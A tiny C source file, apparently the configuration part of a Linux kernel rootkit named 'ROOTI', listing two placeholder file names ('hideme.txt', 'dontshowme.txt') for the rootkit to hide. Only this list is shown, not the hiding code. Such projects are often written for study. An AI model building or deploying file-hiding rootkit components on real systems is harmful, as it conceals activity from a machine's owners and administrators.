#include <linux/array_size.h>
#include "config.h"

const char *ROOTI_HIDDEN_FILES[] = {
    "hideme.txt",
    "dontshowme.txt"
};
const size_t ROOTI_HIDDEN_FILES_COUNT = sizeof(ROOTI_HIDDEN_FILES) / sizeof(ROOTI_HIDDEN_FILES[0]);